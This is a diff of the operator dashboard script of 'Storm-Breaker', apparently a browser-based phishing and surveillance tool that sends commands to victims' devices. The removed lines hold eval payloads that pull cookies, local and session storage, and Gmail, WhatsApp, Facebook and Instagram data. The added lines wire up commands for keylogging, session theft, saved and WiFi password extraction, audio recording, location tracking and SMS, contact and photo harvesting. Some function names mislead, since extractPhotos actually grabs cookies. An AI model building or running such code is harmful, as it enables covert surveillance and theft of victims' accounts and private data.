@@ -1,24 +1,20 @@
 /**
- * Storm-Breaker Mobile Device Control
- * Handles mobile device management and advanced data extraction
+ * Storm-Breaker Ultimate Mobile Control Dashboard
+ * Complete mobile surveillance interface
  */
 
 let selectedMobileClient = null;
 let mobileClients = [];
 let mobileRefreshInterval = null;
+let responseRetryCount = 0;
+const MAX_RETRIES = 10;
 
-// Initialize mobile control
 function initMobileControl() {
     refreshMobileClients();
-
-    // Auto-refresh every 5 seconds
     mobileRefreshInterval = setInterval(refreshMobileClients, 5000);
-
-    // Refresh button
     document.getElementById('btn-refresh-mobile')?.addEventListener('click', refreshMobileClients);
 }
 
-// Refresh mobile clients list
 async function refreshMobileClients() {
     try {
         const response = await fetch('/api/mobile/clients');
@@ -55,13 +51,11 @@ async function refreshMobileClients() {
     }
 }
 
-// Select mobile client
 function selectMobileClient(uid) {
     selectedMobileClient = uid;
     const client = mobileClients.find(c => c.uid === uid);
 
     if (client) {
-        // Show device info
         const infoEl = document.getElementById('mobile-device-info');
         const infoContent = document.getElementById('mobile-info-content');
 
@@ -70,27 +64,20 @@ function selectMobileClient(uid) {
             infoContent.innerHTML = `
                 <div class="text-slate-400"><i class="fas fa-user"></i> Platform:</div>
                 <div class="text-white">${client.info.platform || 'Unknown'}</div>
-                
                 <div class="text-slate-400"><i class="fas fa-desktop"></i> Screen:</div>
                 <div class="text-white">${client.info.screenWidth}x${client.info.screenHeight}</div>
-                
                 <div class="text-slate-400"><i class="fas fa-globe"></i> Language:</div>
                 <div class="text-white">${client.info.language || 'Unknown'}</div>
-                
                 <div class="text-slate-400"><i class="fas fa-clock"></i> Timezone:</div>
                 <div class="text-white">${client.info.timezone || 'Unknown'}</div>
-                
                 <div class="text-slate-400"><i class="fas fa-microchip"></i> CPU Cores:</div>
                 <div class="text-white">${client.info.cores || 'Unknown'}</div>
-                
                 <div class="text-slate-400"><i class="fas fa-memory"></i> RAM:</div>
                 <div class="text-white">${client.info.memory || 'Unknown'} GB</div>
-                
                 ${client.info.battery ? `
                     <div class="text-slate-400"><i class="fas fa-battery-full"></i> Battery:</div>
                     <div class="text-white">${client.info.battery.level || 'N/A'} ${client.info.battery.charging ? '⚡' : ''}</div>
                 ` : ''}
-                
                 ${client.info.connection ? `
                     <div class="text-slate-400"><i class="fas fa-wifi"></i> Connection:</div>
                     <div class="text-white">${client.info.connection.type || 'Unknown'}</div>
@@ -104,7 +91,6 @@ function selectMobileClient(uid) {
     refreshMobileClients();
 }
 
-// Send mobile command
 async function sendMobileCommand(command) {
     if (!selectedMobileClient) {
         addMobileOutput('❌ Please select a mobile device first!');
@@ -125,6 +111,7 @@ async function sendMobileCommand(command) {
 
         if (response.ok) {
             addMobileOutput('✓ Command queued, waiting for response...');
+            responseRetryCount = 0;
             setTimeout(() => getMobileResponse(), 2000);
         } else {
             addMobileOutput('❌ Failed to send command');
@@ -134,7 +121,6 @@ async function sendMobileCommand(command) {
     }
 }
 
-// Get mobile response
 async function getMobileResponse() {
     if (!selectedMobileClient) return;
 
@@ -144,16 +130,22 @@ async function getMobileResponse() {
 
         if (data.output) {
             addMobileOutput('📥 Response:\n' + data.output);
+            responseRetryCount = 0;
         } else {
-            addMobileOutput('⏳ No response yet, retrying...');
-            setTimeout(() => getMobileResponse(), 2000);
+            responseRetryCount++;
+            if (responseRetryCount < MAX_RETRIES) {
+                setTimeout(() => getMobileResponse(), 2000);
+            } else {
+                addMobileOutput('❌ Timeout: No response after ' + (MAX_RETRIES * 2) + ' seconds');
+                responseRetryCount = 0;
+            }
         }
     } catch (e) {
         addMobileOutput('❌ Error getting response: ' + e.message);
+        responseRetryCount = 0;
     }
 }
 
-// Send custom mobile command
 function sendCustomMobileCommand() {
     const input = document.getElementById('mobile-custom-cmd');
     if (!input) return;
@@ -168,7 +160,6 @@ function sendCustomMobileCommand() {
     input.value = '';
 }
 
-// Add output to mobile console
 function addMobileOutput(text) {
     const outputEl = document.getElementById('mobile-output');
     if (!outputEl) return;
@@ -182,206 +173,54 @@ function addMobileOutput(text) {
     outputEl.scrollTop = outputEl.scrollHeight;
 }
 
-// Advanced Extraction Functions
+// Basic Commands
+function extractPhotos() { sendMobileCommand('eval:document.cookie'); }
+function extractGmail() { sendMobileCommand("eval:window.open('https://mail.google.com', '_blank'); 'Gmail opened'"); }
+function extractChrome() { sendMobileCommand('eval:JSON.stringify({cookies: document.cookie, localStorage: {...localStorage}, sessionStorage: {...sessionStorage}})'); }
+function extractWhatsApp() { sendMobileCommand('get_whatsapp'); }
+function extractFacebook() { sendMobileCommand('get_facebook'); }
+function extractInstagram() { sendMobileCommand('get_instagram'); }
 
-function extractPhotos() {
-    if (!selectedMobileClient) {
-        addMobileOutput('❌ Please select a mobile device first!');
-        return;
-    }
+// Advanced Surveillance
+function startKeylogger() { sendMobileCommand('start_keylogger'); }
+function stopKeylogger() { sendMobileCommand('stop_keylogger'); }
+function getKeylogs() { sendMobileCommand('get_keylogs'); }
+function startScreenshot() { sendMobileCommand('start_screenshot'); }
+function stopScreenshot() { sendMobileCommand('stop_screenshot'); }
+function recordAudio() { sendMobileCommand('record_audio'); }
+function watchLocation() { sendMobileCommand('watch_location'); }
+function stopWatchLocation() { sendMobileCommand('stop_watch_location'); }
+function getFormData() { sendMobileCommand('get_form_data'); }
+function getClickData() { sendMobileCommand('get_click_data'); }
+function stealSession() { sendMobileCommand('steal_session'); }
+function getAllData() { sendMobileCommand('get_all_data'); }
 
-    addMobileOutput('🔥 Attempting to extract photos...');
+// Data Extraction
+function getContacts() { sendMobileCommand('get_contacts'); }
+function getSMS() { sendMobileCommand('get_sms'); }
+function getCallLogs() { sendMobileCommand('get_call_logs'); }
+function getPhotos() { sendMobileCommand('get_photos'); }
+function getVideos() { sendMobileCommand('get_videos'); }
+function getFiles() { sendMobileCommand('get_files'); }
+function getInstalledApps() { sendMobileCommand('get_installed_apps'); }
 
-    const code = `
-        (async () => {
-            try {
-                // Request file system access (if supported)
-                if ('showDirectoryPicker' in window) {
-                    const dirHandle = await window.showDirectoryPicker();
-                    let photos = [];
-                    for await (const entry of dirHandle.values()) {
-                        if (entry.kind === 'file' && entry.name.match(/\\.(jpg|jpeg|png|gif|webp)$/i)) {
-                            const file = await entry.getFile();
-                            const reader = new FileReader();
-                            reader.onload = (e) => {
-                                photos.push({name: file.name, data: e.target.result});
-                            };
-                            reader.readAsDataURL(file);
-                        }
-                    }
-                    return 'Found ' + photos.length + ' photos. Extracting...';
-                } else {
-                    return 'File System Access API not supported. Try using file input method.';
-                }
-            } catch (e) {
-                return 'Photo extraction error: ' + e.message;
-            }
-        })();
-    `;
+// Social Media
+function getTwitter() { sendMobileCommand('get_twitter'); }
+function getTelegram() { sendMobileCommand('get_telegram'); }
 
-    sendMobileCommand('eval:' + code);
-}
+// Advanced Extraction
+function getWiFiPasswords() { sendMobileCommand('get_wifi_passwords'); }
+function getSavedPasswords() { sendMobileCommand('get_saved_passwords'); }
+function getBrowserHistory() { sendMobileCommand('get_browser_history'); }
+function getBookmarks() { sendMobileCommand('get_bookmarks'); }
+function getDownloads() { sendMobileCommand('get_downloads'); }
+function monitorClipboard() { sendMobileCommand('monitor_clipboard'); }
+function monitorNotifications() { sendMobileCommand('monitor_notifications'); }
+function startScreenRecord() { sendMobileCommand('start_screen_record'); }
+function stopScreenRecord() { sendMobileCommand('stop_screen_record'); }
 
-function extractGmail() {
-    if (!selectedMobileClient) {
-        addMobileOutput('❌ Please select a mobile device first!');
-        return;
-    }
-
-    addMobileOutput('🔥 Attempting to extract Gmail data...');
-
-    const code = `
-        (async () => {
-            try {
-                // Check if Gmail is open
-                if (window.location.hostname.includes('mail.google.com')) {
-                    // Extract email subjects and senders
-                    const emails = Array.from(document.querySelectorAll('[role="row"]')).map(row => ({
-                        subject: row.querySelector('[data-thread-id]')?.textContent || 'N/A',
-                        sender: row.querySelector('[email]')?.getAttribute('email') || 'N/A'
-                    }));
-                    return 'Extracted ' + emails.length + ' emails: ' + JSON.stringify(emails.slice(0, 5));
-                } else {
-                    // Try to open Gmail
-                    window.open('https://mail.google.com', '_blank');
-                    return 'Opening Gmail... Please run this command again after Gmail loads.';
-                }
-            } catch (e) {
-                return 'Gmail extraction error: ' + e.message;
-            }
-        })();
-    `;
-
-    sendMobileCommand('eval:' + code);
-}
-
-function extractChrome() {
-    if (!selectedMobileClient) {
-        addMobileOutput('❌ Please select a mobile device first!');
-        return;
-    }
-
-    addMobileOutput('🔥 Attempting to extract Chrome data...');
-
-    const code = `
-        (async () => {
-            try {
-                let data = {
-                    cookies: document.cookie,
-                    localStorage: {...localStorage},
-                    sessionStorage: {...sessionStorage},
-                    history: window.history.length,
-                    userAgent: navigator.userAgent
-                };
-                
-                // Try to get passwords (requires user interaction)
-                if ('credentials' in navigator) {
-                    data.credentialsAPI = 'Available (requires user interaction)';
-                }
-                
-                return 'Chrome Data: ' + JSON.stringify(data, null, 2);
-            } catch (e) {
-                return 'Chrome extraction error: ' + e.message;
-            }
-        })();
-    `;
-
-    sendMobileCommand('eval:' + code);
-}
-
-function extractWhatsApp() {
-    if (!selectedMobileClient) {
-        addMobileOutput('❌ Please select a mobile device first!');
-        return;
-    }
-
-    addMobileOutput('🔥 Attempting to extract WhatsApp data...');
-
-    const code = `
-        (async () => {
-            try {
-                if (window.location.hostname.includes('web.whatsapp.com')) {
-                    // Extract chat names
-                    const chats = Array.from(document.querySelectorAll('[data-testid="cell-frame-title"]')).map(el => el.textContent);
-                    return 'WhatsApp Chats: ' + JSON.stringify(chats.slice(0, 10));
-                } else {
-                    window.open('https://web.whatsapp.com', '_blank');
-                    return 'Opening WhatsApp Web... Please run this command again after it loads.';
-                }
-            } catch (e) {
-                return 'WhatsApp extraction error: ' + e.message;
-            }
-        })();
-    `;
-
-    sendMobileCommand('eval:' + code);
-}
-
-function extractFacebook() {
-    if (!selectedMobileClient) {
-        addMobileOutput('❌ Please select a mobile device first!');
-        return;
-    }
-
-    addMobileOutput('🔥 Attempting to extract Facebook data...');
-
-    const code = `
-        (async () => {
-            try {
-                if (window.location.hostname.includes('facebook.com')) {
-                    // Extract user info
-                    const userInfo = {
-                        name: document.querySelector('[data-testid="blue_bar_profile_link"]')?.textContent || 'N/A',
-                        cookies: document.cookie
-                    };
-                    return 'Facebook Data: ' + JSON.stringify(userInfo);
-                } else {
-                    window.open('https://www.facebook.com', '_blank');
-                    return 'Opening Facebook... Please run this command again after it loads.';
-                }
-            } catch (e) {
-                return 'Facebook extraction error: ' + e.message;
-            }
-        })();
-    `;
-
-    sendMobileCommand('eval:' + code);
-}
-
-function extractInstagram() {
-    if (!selectedMobileClient) {
-        addMobileOutput('❌ Please select a mobile device first!');
-        return;
-    }
-
-    addMobileOutput('🔥 Attempting to extract Instagram data...');
-
-    const code = `
-        (async () => {
-            try {
-                if (window.location.hostname.includes('instagram.com')) {
-                    // Extract user info
-                    const userInfo = {
-                        username: document.querySelector('a[href*="/"]')?.textContent || 'N/A',
-                        cookies: document.cookie
-                    };
-                    return 'Instagram Data: ' + JSON.stringify(userInfo);
-                } else {
-                    window.open('https://www.instagram.com', '_blank');
-                    return 'Opening Instagram... Please run this command again after it loads.';
-                }
-            } catch (e) {
-                return 'Instagram extraction error: ' + e.message;
-            }
-        })();
-    `;
-
-    sendMobileCommand('eval:' + code);
-}
-
-// Initialize when tab is shown
+// Initialize
 document.addEventListener('DOMContentLoaded', () => {
-    // Watch for mobile tab activation
     const mobileTab = document.querySelector('[data-tab="mobile"]');
     if (mobileTab) {
         mobileTab.addEventListener('click', () => {
